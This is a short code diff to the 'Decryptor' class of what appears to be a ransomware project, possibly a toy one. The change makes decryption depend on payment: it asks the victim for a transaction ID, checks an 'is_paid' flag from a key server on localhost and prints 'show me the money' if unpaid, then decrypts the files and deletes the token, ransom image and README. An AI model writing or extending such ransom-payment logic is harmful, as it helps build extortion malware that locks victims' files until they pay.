@@ -62,19 +62,25 @@ class Decryptor:
 
     # 실행
     def run(self):
-        token = open("token.txt", "r").read()
+        self.token = open("token.txt", "r").read()
         # Scan the file system
         num_files = self.scan()
         if num_files == 0:
             return
-        res = self.get_key(token)
-        if res.get("status", "") == False:
+        
+
+        self.txid = input("TXID : ")
+        # Get the key from the server
+        res = requests.get("http://127.0.0.1:5000/get_key?token=" + self.token + "&txid=" + self.txid).json()
+
+        if res.get("is_paid") == False:
             print("show me the money")
             return
         key = res.get("key", "")
         self.decrypt(key)
         os.remove("token.txt")
         os.remove("rickRolled.png")
+        os.remove("README.txt")
         
 
 if __name__ == '__main__':
